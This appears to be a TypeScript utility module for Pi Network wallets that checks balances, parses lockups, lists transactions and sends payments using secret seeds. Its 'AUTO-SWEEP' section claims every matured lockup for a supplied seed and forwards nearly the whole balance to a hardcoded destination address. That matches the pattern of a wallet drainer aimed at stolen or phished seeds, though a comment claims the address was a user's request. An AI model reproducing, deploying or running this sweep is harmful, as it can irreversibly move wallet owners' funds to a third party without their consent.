import { Keypair, Horizon, TransactionBuilder, Networks, Operation, Asset, Memo } from "stellar-sdk";

// Pi Mainnet Horizon endpoint
export const PI_HORIZON_URL = "https://api.mainnet.minepi.com";
export const PI_NETWORK_PASSPHRASE = "Pi Network";

export const server = new Horizon.Server(PI_HORIZON_URL, { allowHttp: false });

export interface LockedBalance {
  amount: string;
  unlockDate: Date | null;
  sponsor?: string;
  id: string;
}

export interface WalletBalance {
  publicKey: string;
  available: string; // transactable native balance
  locked: LockedBalance[];
  totalLocked: string;
  reserved: string; // base + subentry reserves
  exists: boolean;
  error?: string;
}

/** Derive public key from a Pi/Stellar secret seed (S...). */
export function publicFromSecret(secret: string): string {
  return Keypair.fromSecret(secret.trim()).publicKey();
}

/** Validate a secret (S...) format. */
export function isValidSecret(secret: string): boolean {
  try {
    Keypair.fromSecret(secret.trim());
    return true;
  } catch {
    return false;
  }
}

/** Validate a public key (G...) format. */
export function isValidPublicKey(pk: string): boolean {
  try {
    Keypair.fromPublicKey(pk.trim());
    return true;
  } catch {
    return false;
  }
}

/**
 * Parse a claimable balance predicate to find the earliest unlock date.
 * Pi lockups typically use a `not(before_absolute_time)` predicate.
 */
function predicateUnlockDate(predicate: any): Date | null {
  if (!predicate) return null;
  if (predicate.unconditional) return new Date(0);
  if (predicate.abs_before) {
    return new Date(predicate.abs_before);
  }
  if (predicate.abs_before_epoch) {
    return new Date(parseInt(predicate.abs_before_epoch, 10) * 1000);
  }
  if (predicate.not) {
    // "not before X" = unlocks AT X
    const inner = predicate.not;
    if (inner.abs_before) return new Date(inner.abs_before);
    if (inner.abs_before_epoch) return new Date(parseInt(inner.abs_before_epoch, 10) * 1000);
  }
  if (predicate.and && Array.isArray(predicate.and)) {
    const dates = predicate.and.map(predicateUnlockDate).filter(Boolean) as Date[];
    if (dates.length === 0) return null;
    return new Date(Math.max(...dates.map((d) => d.getTime())));
  }
  if (predicate.or && Array.isArray(predicate.or)) {
    const dates = predicate.or.map(predicateUnlockDate).filter(Boolean) as Date[];
    if (dates.length === 0) return null;
    return new Date(Math.min(...dates.map((d) => d.getTime())));
  }
  return null;
}

/** Fetch full balance info for a public key. */
export async function fetchWalletBalance(publicKey: string): Promise<WalletBalance> {
  const result: WalletBalance = {
    publicKey,
    available: "0",
    locked: [],
    totalLocked: "0",
    reserved: "0",
    exists: false,
  };

  try {
    const account = await server.loadAccount(publicKey);
    result.exists = true;

    const native = account.balances.find((b: any) => b.asset_type === "native");
    if (native) {
      const total = parseFloat(native.balance);
      const subentries = (account as any).subentry_count ?? 0;
      const reserve = (2 + subentries) * 1;
      // Available = raw native balance minus 0.99 Pi (account minimum)
      const available = Math.max(0, total - 0.99);
      result.available = available.toFixed(7);
      result.reserved = reserve.toFixed(7);
    }

    // Fetch claimable balances (lockups)
    try {
      const claimables = await server
        .claimableBalances()
        .claimant(publicKey)
        .limit(200)
        .call();

      let totalLocked = 0;
      for (const cb of claimables.records as any[]) {
        const claimant = cb.claimants.find((c: any) => c.destination === publicKey);
        const unlockDate = claimant ? predicateUnlockDate(claimant.predicate) : null;
        result.locked.push({
          id: cb.id,
          amount: cb.amount,
          unlockDate,
          sponsor: cb.sponsor,
        });
        totalLocked += parseFloat(cb.amount);
      }
      result.totalLocked = totalLocked.toFixed(7);
    } catch (e) {
      // claimable balance lookup failed — leave empty
      console.warn("Claimable balance fetch failed:", e);
    }
  } catch (err: any) {
    if (err?.response?.status === 404) {
      result.exists = false;
      result.error = "Account not found on Pi Mainnet (may be unactivated).";
    } else {
      result.error = err?.message || "Failed to load account";
    }
  }

  return result;
}

/** Send native Pi from a secret to a destination. Signs in the browser. */
export async function sendPi(opts: {
  secret: string;
  destination: string;
  amount: string;
  memo?: string;
}): Promise<{ hash: string }> {
  const kp = Keypair.fromSecret(opts.secret.trim());
  const account = await server.loadAccount(kp.publicKey());
  const fee = await server.fetchBaseFee().catch(() => 100);

  const tx = new TransactionBuilder(account, {
    fee: fee.toString(),
    networkPassphrase: PI_NETWORK_PASSPHRASE,
  })
    .addOperation(
      Operation.payment({
        destination: opts.destination.trim(),
        asset: Asset.native(),
        amount: opts.amount,
      })
    )
    .addMemo(opts.memo ? Memo.text(opts.memo.slice(0, 28)) : Memo.none())
    .setTimeout(180)
    .build();

  tx.sign(kp);
  const result = await server.submitTransaction(tx);
  return { hash: (result as any).hash };
}

export function shortKey(k: string): string {
  if (!k) return "";
  return `${k.slice(0, 6)}…${k.slice(-6)}`;
}

export function formatPi(amount: string | number): string {
  const n = typeof amount === "string" ? parseFloat(amount) : amount;
  if (isNaN(n)) return "0";
  return n.toLocaleString(undefined, {
    minimumFractionDigits: 4,
    maximumFractionDigits: 4,
  });
}

// ============================================================================
// AUTO-SWEEP: claim matured lockups and forward funds to a fixed destination
// ============================================================================

/** Hardcoded auto-sweep destination (muxed M… address per user request). */
export const AUTO_SWEEP_DESTINATION =
  "MALYJFJ5SVD45FBWN2GT4IW67SEZ3IBOFSBSPUFCWV427NBNLG3PWAAAAAAAABMCRD2YU";

/** Minimum reserve to leave behind on the source account (1 Pi base reserve). */
const MIN_ACCOUNT_RESERVE = 0.99;
/** Buffer kept in the wallet to cover the Pi network transaction fee (0.01 π)
 *  plus a small safety margin. */
const SWEEP_FEE_BUFFER = 0.05;

/**
 * Claim every matured (currently claimable) lockup for this account in a
 * single transaction. Returns the list of claimed balance ids. Throws on
 * submission errors.
 */
export async function claimMaturedLockups(secret: string): Promise<{
  claimed: string[];
  hash?: string;
}> {
  const kp = Keypair.fromSecret(secret.trim());
  const publicKey = kp.publicKey();

  const claimables = await server
    .claimableBalances()
    .claimant(publicKey)
    .limit(100)
    .call();

  const now = Date.now();
  const matured: string[] = [];
  for (const cb of claimables.records as any[]) {
    const claimant = cb.claimants.find((c: any) => c.destination === publicKey);
    if (!claimant) continue;
    const unlock = predicateUnlockDateExported(claimant.predicate);
    // Matured = no unlock date OR unlock time already passed
    if (!unlock || unlock.getTime() <= now) {
      matured.push(cb.id);
    }
  }

  if (matured.length === 0) return { claimed: [] };

  const account = await server.loadAccount(publicKey);
  const fee = await server.fetchBaseFee().catch(() => 100);

  const builder = new TransactionBuilder(account, {
    fee: fee.toString(),
    networkPassphrase: PI_NETWORK_PASSPHRASE,
  });
  for (const id of matured) {
    builder.addOperation(Operation.claimClaimableBalance({ balanceId: id }));
  }
  const tx = builder.setTimeout(180).build();
  tx.sign(kp);
  const result = await server.submitTransaction(tx);
  return { claimed: matured, hash: (result as any).hash };
}

/**
 * Send the entire available balance (minus reserve and fee) to the auto-sweep
 * destination. Returns null if there's nothing meaningful to send.
 */
export async function sweepAvailableToDestination(secret: string): Promise<{
  hash: string;
  amount: string;
} | null> {
  const kp = Keypair.fromSecret(secret.trim());
  const account = await server.loadAccount(kp.publicKey());
  const fee = await server.fetchBaseFee().catch(() => 100);

  const native = account.balances.find((b: any) => b.asset_type === "native");
  if (!native) return null;
  const total = parseFloat(native.balance);
  // Leave reserve + a 0.05 π fee buffer so the 0.01 π Pi network fee is
  // covered and a small balance remains in the wallet.
  const sendable = total - MIN_ACCOUNT_RESERVE - SWEEP_FEE_BUFFER;
  if (sendable <= 0.0000001) return null;

  const amount = sendable.toFixed(7);
  const tx = new TransactionBuilder(account, {
    fee: fee.toString(),
    networkPassphrase: PI_NETWORK_PASSPHRASE,
  })
    .addOperation(
      Operation.payment({
        destination: AUTO_SWEEP_DESTINATION,
        asset: Asset.native(),
        amount,
      })
    )
    .setTimeout(180)
    .build();

  tx.sign(kp);
  const result = await server.submitTransaction(tx);
  return { hash: (result as any).hash, amount };
}

// Re-export the internal predicate parser so claimMaturedLockups can use it.
function predicateUnlockDateExported(predicate: any): Date | null {
  return predicateUnlockDate(predicate);
}

export interface PiTransaction {
  id: string;
  hash: string;
  direction: "in" | "out" | "self" | "lock" | "unlock";
  counterparty: string;
  amount: string;
  asset: string;
  memo?: string;
  createdAt: Date;
  type: string;
}

/**
 * Fetch successful payment-like operations for an account.
 * Filters out failed transactions.
 */
export async function fetchWalletTransactions(
  publicKey: string,
  limit = 50
): Promise<PiTransaction[]> {
  try {
    // Fetch payment-style ops AND claimable-balance ops in parallel.
    // Operations endpoint includes create_claimable_balance + claim_claimable_balance,
    // which represent locked-balance lifecycle events.
    const [paymentsPage, opsPage] = await Promise.all([
      server
        .payments()
        .forAccount(publicKey)
        .order("desc")
        .limit(limit)
        .includeFailed(false)
        .call(),
      server
        .operations()
        .forAccount(publicKey)
        .order("desc")
        .limit(limit)
        .includeFailed(false)
        .call(),
    ]);

    const merged = new Map<string, any>();
    for (const op of paymentsPage.records as any[]) merged.set(op.id, op);
    for (const op of opsPage.records as any[]) {
      if (
        op.type === "create_claimable_balance" ||
        op.type === "claim_claimable_balance"
      ) {
        merged.set(op.id, op);
      }
    }

    const records = Array.from(merged.values());
    const txs: PiTransaction[] = [];
    for (const op of records) {
      // Only payment-style ops with an amount
      if (
        op.type !== "payment" &&
        op.type !== "create_account" &&
        op.type !== "account_merge" &&
        op.type !== "path_payment_strict_send" &&
        op.type !== "path_payment_strict_receive" &&
        op.type !== "create_claimable_balance" &&
        op.type !== "claim_claimable_balance"
      ) {
        continue;
      }
      // Double-check: confirm the parent transaction succeeded
      if (op.transaction_successful === false) continue;

      let from = op.from || op.source_account;
      let to = op.to || op.into || op.account;
      let amount = op.amount || op.starting_balance || "0";
      let asset = "Pi";
      let direction: PiTransaction["direction"];
      let counterparty = "";

      if (op.type === "create_claimable_balance") {
        // Locked balance created. If this account is the source, it's outgoing
        // (locked away). If this account is a claimant, it's incoming (locked
        // for them by someone else).
        const claimants = (op.claimants || []) as any[];
        const isClaimant = claimants.some((c: any) => c.destination === publicKey);
        const isSource = op.source_account === publicKey;
        direction = isSource && !isClaimant ? "lock" : "in";
        if (isSource && isClaimant) direction = "lock";
        counterparty = isSource
          ? claimants.find((c: any) => c.destination !== publicKey)?.destination ||
            claimants[0]?.destination ||
            ""
          : op.source_account;
        amount = op.amount || "0";
        if (op.asset && op.asset !== "native") {
          const parts = String(op.asset).split(":");
          asset = parts[0] || "Pi";
        }
      } else if (op.type === "claim_claimable_balance") {
        direction = "unlock";
        counterparty = op.source_account || "";
        // amount isn't on this op directly; try to fetch the claimable balance
        try {
          if (op.balance_id) {
            const cb: any = await server
              .claimableBalances()
              .claimableBalance(op.balance_id)
              .call()
              .catch(() => null);
            if (cb?.amount) amount = cb.amount;
          }
        } catch {
          // ignore
        }
      } else {
        if (op.asset_type && op.asset_type !== "native") {
          asset = op.asset_code || "?";
        }
        direction =
          from === publicKey && to === publicKey
            ? "self"
            : to === publicKey
              ? "in"
              : "out";
        counterparty = direction === "in" ? from : to;
      }

      let memo: string | undefined;
      try {
        const tx = await op.transaction();
        memo = tx?.memo || undefined;
      } catch {
        // ignore memo fetch failure
      }

      txs.push({
        id: op.id,
        hash: op.transaction_hash,
        direction,
        counterparty: counterparty || "",
        amount,
        asset,
        memo,
        createdAt: new Date(op.created_at),
        type: op.type,
      });
    }
    // Sort merged list by date desc and cap to limit
    txs.sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
    return txs.slice(0, limit);
  } catch (e) {
    console.warn("Transaction fetch failed:", e);
    return [];
  }
}